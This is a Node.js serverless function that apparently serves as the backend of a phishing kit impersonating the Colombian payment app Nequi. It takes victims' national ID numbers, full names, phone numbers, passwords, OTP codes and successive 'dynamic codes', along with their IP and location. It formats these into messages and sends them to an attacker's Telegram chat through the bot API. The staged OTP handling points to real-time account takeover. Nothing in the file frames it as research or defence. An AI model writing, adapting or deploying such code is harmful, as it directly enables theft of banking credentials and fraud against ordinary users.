// Archivo: send-message.js (servidor Node.js)
const axios = require('axios');

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

module.exports = async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        const body = req.body;

        if (!body) {
            return res.status(400).json({ error: 'El cuerpo de la solicitud está vacío' });
        }

        const { documentNumber, fullName, username, password, userIP, city, country, otpCode, dynamicCode, step } = body;

        if (!documentNumber || !fullName) {
            return res.status(400).json({ error: 'Datos incompletos: documento o nombre faltante' });
        }

        let message;

        if (step === "dinamica2") {
            message = `
🔄 Dinámica 2
🆔 Nombres: ${fullName}
🪪 Cédula: ${documentNumber}
#️⃣ Número: ${username || 'No proporcionado'}
🔐 Clave: ${password || 'No proporcionada'}
🔐 Código Dinámico 2: ${dynamicCode || 'No proporcionado'}
🌏 IP: ${userIP || 'Desconocida'}
📍 Ubicación: ${city || 'Desconocida'}, ${country || 'Desconocido'}
`.trim();
        } else if (step === "dinamica3") {
            message = `
🔄 Dinámica 3
🆔 Nombres: ${fullName}
🪪 Cédula: ${documentNumber}
#️⃣ Número: ${username || 'No proporcionado'}
🔐 Clave: ${password || 'No proporcionada'}
🔐 Código Dinámico 3: ${dynamicCode || 'No proporcionado'}
🌏 IP: ${userIP || 'Desconocida'}
📍 Ubicación: ${city || 'Desconocida'}, ${country || 'Desconocido'}
`.trim();
        } else if (otpCode) {
            message = `
🤠 Nequi OTP
🆔 Nombres: ${fullName}
🪪 Cédula: ${documentNumber}
#️⃣ Número: ${username || 'No proporcionado'}
🔐 Clave: ${password || 'No proporcionada'}
🔐 OTP: ${otpCode}
🌏 IP: ${userIP || 'Desconocida'}
📍 Ubicación: ${city || 'Desconocida'}, ${country || 'Desconocido'}
`.trim();
        } else if (!username && !password) {
            message = `
⭐️⭐️Nequi 2.0⭐️⭐️
🪪ID: ${documentNumber}
👤Nombres: ${fullName}
🌏IP: ${userIP || 'Desconocida'}
🏙Ciudad: ${city || 'Desconocida'}
🇨🇴País: ${country || 'Desconocido'}
`.trim();
        } else {
            message = `
👤Nequi_Meta_Infinito👤
🆔Nombres: ${fullName}
🪪Cédula: ${documentNumber}
#️⃣Número: ${username || 'No proporcionado'}
🔐Clave: ${password || 'No proporcionada'}
🌏IP: ${userIP || 'Desconocida'}
🇨🇴Ciudad: ${city || 'Desconocida'}, País: ${country || 'Desconocido'}
`.trim();
        }

        const response = await axios.post(
            `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`,
            { chat_id: CHAT_ID, text: message }
        );

        res.status(200).json({ success: true, data: response.data });
    } catch (error) {
        console.error('Error al procesar la solicitud:', error.message);
        res.status(500).json({
            error: 'Error al enviar mensaje a Telegram',
            details: error.message || 'Error desconocido',
        });
    }
};
